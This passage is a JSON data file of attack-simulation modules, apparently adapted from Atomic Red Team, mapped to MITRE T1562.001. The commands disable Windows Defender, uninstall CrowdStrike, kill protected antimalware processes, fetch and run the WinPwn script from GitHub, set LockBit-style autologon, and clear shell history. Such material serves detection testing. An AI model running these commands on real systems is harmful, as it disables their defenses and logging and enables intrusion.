        "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6f5fb61b-4e56-4a3d-a8c3-82e13686c6d7",
      "module_name": "Disable Microsoft Office Security Features"
    },
    {
      "index": 1519,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3d47daaa-2f56-43e0-94cc-caf5d8d52a68",
      "module_name": "Remove Windows Defender Definition Files"
    },
    {
      "index": 1520,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Stop-Service -Name #{service_name}\nRemove-Service -Name #{service_name}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "service_name",
          "description": "The name of the service to remove",
          "type": "string",
          "default_value": "McAfeeDLPAgentService"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "ae753dda-0f15-4af6-a168-b9ba16143143",
      "module_name": "Stop and Remove Arbitrary Security Windows Service"
    },
    {
      "index": 1521,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "if (Test-Path \"#{falcond_path}\") {. \"#{falcond_path}\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "falcond_path",
          "description": "The Crowdstrike Windows Sensor path. The Guid always changes.",
          "type": "path",
          "default_value": "C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b32b1ccf-f7c1-49bc-9ddd-7d7466a7b297",
      "module_name": "Uninstall Crowdstrike Falcon on Windows"
    },
    {
      "index": 1522,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$excludedpath= \"#{excluded_folder}\"\nAdd-MpPreference -ExclusionPath $excludedpath",
        "elevation_required": true,
        "cleanup_command": "$excludedpath= \"#{excluded_folder}\"\nRemove-MpPreference -ExclusionPath $excludedpath\n"
      },
      "variables": [
        {
          "name": "excluded_folder",
          "description": "This folder will be excluded from scanning",
          "type": "path",
          "default_value": "C:\\Temp"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "0b19f4ee-de90-4059-88cb-63c800c683ed",
      "module_name": "Tamper with Windows Defender Evade Scanning -Folder"
    },
    {
      "index": 1523,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$excludedExts= \"#{excluded_exts}\"\nAdd-MpPreference -ExclusionExtension  $excludedExts",
        "elevation_required": true,
        "cleanup_command": "$excludedExts= \"#{excluded_exts}\"\nRemove-MpPreference -ExclusionExtension  $excludedExts -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "excluded_exts",
          "description": "A list of extension to exclude from scanning",
          "type": "string",
          "default_value": ".exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "315f4be6-2240-4552-b3e1-d1047f5eecea",
      "module_name": "Tamper with Windows Defender Evade Scanning -Extension"
    },
    {
      "index": 1524,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$excludedProcess = \"#{excluded_process}\"\nAdd-MpPreference -ExclusionProcess $excludedProcess",
        "elevation_required": true,
        "cleanup_command": "$excludedProcess = \"#{excluded_process}\"\nRemove-MpPreference -ExclusionProcess  $excludedProcess\n"
      },
      "variables": [
        {
          "name": "excluded_process",
          "description": "A list of processes to exclude from scanning",
          "type": "string",
          "default_value": "outlook.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a123ce6a-3916-45d6-ba9c-7d4081315c27",
      "module_name": "Tamper with Windows Defender Evade Scanning -Process"
    },
    {
      "index": 1525,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n",
      "execution": {
        "platforms": [
          "office-365"
        ],
        "executor_type": "powershell",
        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n",
        "elevation_required": false,
        "cleanup_command": "if(\"#{password}\" -ne \"\") {\n$secure_pwd = (\"#{password}\" + \"\") | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nEnable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n} \n"
      },
      "variables": [
        {
          "name": "username",
          "description": "office-365 username",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "office-365 password",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "ExchangeOnlineManagement PowerShell module must be installed\n",
          "check_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
          "install_command": "Install-Module -Name ExchangeOnlineManagement\nImport-Module ExchangeOnlineManagement\n"
        }
      ],
      "rx_module_id": "b9bbae2c-2ba6-4cf3-b452-8e8f908696f3",
      "module_name": "office-365-Disable-AntiPhishRule"
    },
    {
      "index": 1526,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "The following RAGLOX will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "871438ac-7d6e-432a-b27d-3e7db69faf58",
      "module_name": "Disable Windows Defender with DISM"
    },
    {
      "index": 1527,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis RAGLOX will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(#{delete_defender_folder}){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n",
        "elevation_required": true,
        "cleanup_command": "Try {cmd /c \"#{AdvancedRun_Location}\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"start WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n"
      },
      "variables": [
        {
          "name": "AdvancedRun_Location",
          "description": "Path of Advanced Run executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\AdvancedRun.exe"
        },
        {
          "name": "delete_defender_folder",
          "description": "Set to 1 to also delete the Windows Defender folder",
          "type": "integer",
          "default_value": 0
        }
      ],
      "prerequisites": [
        {
          "description": "Advancedrun.exe must exist at #{AdvancedRun_Location}\n",
          "check_command": "if(Test-Path -Path \"#{AdvancedRun_Location}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"http://www.nirsoft.net/utils/advancedrun.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\advancedrun.zip\"\nExpand-Archive -path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\advancedrun.zip\" -destinationpath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -Force\n"
        }
      ],
      "rx_module_id": "81ce22fd-9612-4154-918e-8a1f285d214d",
      "module_name": "Disable Defender Using NirSoft AdvancedRun"
    },
    {
      "index": 1528,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "& \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n #{process_name}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "process_name",
          "description": "Name of the protected process you want to kill/terminate.",
          "type": "string",
          "default_value": "MsMpEng.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Backstab64.exe should exist in ExtrnalPayloads Directory",
          "check_command": "if (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Backstab64.exe\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Backstab64.exe\"\n"
        }
      ],
      "rx_module_id": "24a12b91-05a7-4deb-8d7f-035fa98591bc",
      "module_name": "Kill antimalware protected processes using Backstab"
    },
    {
      "index": 1529,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Kill the event log services for stealth via function of WinPwn",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive  ",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66",
      "module_name": "WinPwn - Kill the event log services for stealth"
    },
    {
      "index": 1530,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n",
        "elevation_required": true,
        "cleanup_command": "Set-MpPreference -drtm 0\nSet-MpPreference -dbm 0\nSet-MpPreference -dscrptsc 0\nSet-MpPreference -dbaf 0\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c531aa6e-9c97-4b29-afee-9b7be6fc8a64",
      "module_name": "Tamper with Windows Defender ATP using Aliases - PowerShell"
    },
    {
      "index": 1531,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d6d22332-d07d-498f-aea0-6139ecb7850e",
      "module_name": "LockBit Black - Disable Privacy Settings Experience Using Registry -cmd"
    },
    {
      "index": 1532,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "LockBit Black - Use Registry Editor to turn on automatic logon\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /f >nul 2>&1\nreg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9719d0e1-4fe0-4b2e-9a72-7ad3ee8ddc70",
      "module_name": "LockBit Black - Use Registry Editor to turn on automatic logon -cmd"
    },
    {
      "index": 1533,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d8c57eaa-497a-4a08-961e-bd5efd7c9374",
      "module_name": "LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell"
    },
    {
      "index": 1534,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Force -ErrorAction Ignore\nRemove-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5e27f36d-5132-4537-b43b-413b0d5eec9a",
      "module_name": "Lockbit Black - Use Registry Editor to turn on automatic logon -Powershell"
    },
    {
      "index": 1535,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "The following RAGLOX will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f542ffd3-37b4-4528-837f-682874faa012",
      "module_name": "Disable Windows Defender with PwSh Disable-WindowsOptionalFeature"
    },
    {
      "index": 1536,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "The following RAGLOX will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"RAGLOX\\\"\n",
        "elevation_required": true,
        "cleanup_command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Remove ExclusionPath=\\\"RAGLOX\\\"\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "59d386fc-3a4b-41b8-850d-9e3eee24dfe4",
      "module_name": "WMIC Tamper with Windows Defender Evade Scanning Folder"
    },
    {
      "index": 1537,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "The following RAGLOX module will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )\n",
        "elevation_required": true,
        "cleanup_command": "schtasks /create /xml \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cleanup.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Verification.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f\nschtasks /create /xml \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "The Windows Defender scheduled tasks must be backed up first\n",
          "check_command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( EXIT 0 ) ELSE ( EXIT 1 )\n",
          "install_command": "schtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" > \"%temp%\\Windows_Defender_Scheduled_Scan.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" > \"%temp%\\Windows_Defender_Cleanup.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" > \"%temp%\\Windows_Defender_Verification.xml\"\nschtasks /query /xml /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" > \"%temp%\\Windows_Defender_Cache_Maintenance.xml\"\n"
        }
      ],
      "rx_module_id": "4b841aa1-0d05-4b32-bbe7-7564346e7c76",
      "module_name": "Delete Windows Defender Scheduled Tasks"
    },
    {
      "index": 1538,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Clear Shell History. This technique only affect the bash shell application. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "history -c\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "23b88394-091b-4968-a42d-fb8076992443",
      "module_name": "Clear History"
    },
    {
      "index": 1539,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "set +o history\n",
        "elevation_required": true,
        "cleanup_command": "set -o history\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "94f6a1c9-aae7-46a4-9083-2bb1f5768ec4",
      "module_name": "Suspend History"
    },
    {
      "index": 1540,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "reboot system via system request seen in Awfulshred wiper.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger \n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6d6d3154-1a52-4d1a-9d51-92ab8148b32e",
      "module_name": "Reboot Linux Host via Kernel System Request"
    },
    {
      "index": 1541,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "free && echo 3 > /proc/sys/vm/drop_caches && free\necho 3> /proc/sys/vm/drop_caches \n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f790927b-ea85-4a16-b7b2-7eb44176a510",
      "module_name": "Clear Pagging Cache"
    },
    {
      "index": 1542,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "swapon -a \nsleep 2\nswapoff -a\nsync\n",
        "elevation_required": true,
        "cleanup_command": "swapon -a\nsleep 2\nsync\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "e74e4c63-6fde-4ad2-9ee8-21c3a1733114",
      "module_name": "Disable Memory Swap"
    },
    {
      "index": 1543,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /f\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "HVCI must be enabled\n",
